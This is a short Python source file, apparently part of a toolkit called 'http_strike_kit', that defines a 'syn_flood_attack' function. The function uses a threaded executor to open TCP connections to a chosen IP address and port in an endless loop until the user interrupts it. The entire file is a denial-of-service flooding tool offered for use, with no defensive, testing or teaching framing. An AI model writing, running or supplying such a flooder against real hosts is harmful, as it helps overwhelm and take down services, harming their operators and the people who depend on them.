import socket

from http_strike_kit.utils.thread_exec import ThreadedExecutor


def _syn_once(target: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target, port))
        sock.close()
    except:
        pass


def syn_flood_attack(target: str, port: int, workers: int) -> None:
    """
    send syn packets to target, run until the user interrupts.
    :param target: ip address
    :param port: port targets
    :param workers: maximum workers to run at once.
    """
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()
    try:
        while True:
            executor.submit(_syn_once, target, port)
    except KeyboardInterrupt:
        executor.wait()
